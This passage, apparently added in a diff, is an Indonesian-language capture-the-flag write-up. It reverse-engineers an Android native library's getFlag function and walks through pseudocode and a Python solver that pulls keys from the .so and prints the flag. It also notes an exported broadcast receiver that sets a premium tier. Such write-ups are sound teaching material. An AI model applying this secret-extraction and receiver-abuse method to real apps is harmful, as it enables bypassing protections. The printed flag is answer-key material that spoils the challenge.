+- `0x6810`: `frozen_gift_shop_winter_2025_secret_salt_key` (44 byte)
+- `0x683c`: `09 d2 16 66 39 af ... d3 38` (30 byte)
+
+Kalau ini bukan “flag key schedule”, aku bukan aku.
+
+---
+
+### Pseudocode hasil convert dari ASM (inti `getFlag`)
+
+ASM lengkapnya panjang (banyak runtime glue), tapi core-nya bisa diringkas jadi begini:
+
+```c
+// address map (x86_64):
+// key32 @ 0x67d0 (32 bytes)
+// salt  @ 0x6810 (44 bytes string)
+// enc30 @ 0x683c (30 bytes)
+// getFlag() @ 0x138a8
+
+string getFlag(string tier) {
+    // derive dynamic key from user-controlled tier
+    bytes k = sha256(tier + "frozen_gift_shop_winter_2025_secret_salt_key");
+
+    // two-key XOR obfuscation
+    // flag[i] = enc30[i] ^ key32[i] ^ k[i]
+    bytes flag[30];
+    for (i = 0; i < 30; i++) {
+        flag[i] = enc30[i] ^ key32[i] ^ k[i];
+    }
+
+    return bytes_to_string(flag);
+}
+```
+
+Di titik ini, kita bahkan nggak butuh emulator lagi: cukup ambil 3 konstanta itu dari `.so`, hitung SHA-256, lalu XOR.
+
+---
+
+### Solver: ambil flag langsung dari `libsnowflag.so`
+
+Ini script Python yang aku pakai (sekalian “proof” bahwa algoritmanya bener):
+
+```py
+import hashlib
+
+path = "out_apktool/lib/x86_64/libsnowflag.so"
+with open(path, "rb") as f:
+    data = f.read()
+
+key32 = data[0x67d0:0x67d0 + 32]
+salt  = data[0x6810:0x6810 + 0x2c]      # 44 bytes
+enc30 = data[0x683c:0x683c + 30]
+
+tier = b"aurora_vip"
+k = hashlib.sha256(tier + salt).digest()[:30]
+
+flag = bytes(enc30[i] ^ key32[i] ^ k[i] for i in range(30))
+print(flag.decode())
+```
+
+Output:
+
+```
+flag{Sn0wf4ll_br0adCa$t_BonUs}
+```
+
+Ini juga nyambung sama jalur app:
+
+- `SnowRewardReceiver` memungkinkan kita set `tier = aurora_vip`
+- `MainActivity` hanya memanggil `getFlag(tier)` ketika tier premium
+- native `getFlag()` menggunakan `tier` sebagai input untuk derive key SHA-256
+
+Rapi, dan cukup jahil buat challenge “Medium”.
+
+### Flag
+
+`flag{Sn0wf4ll_br0adCa$t_BonUs}`
+
+---
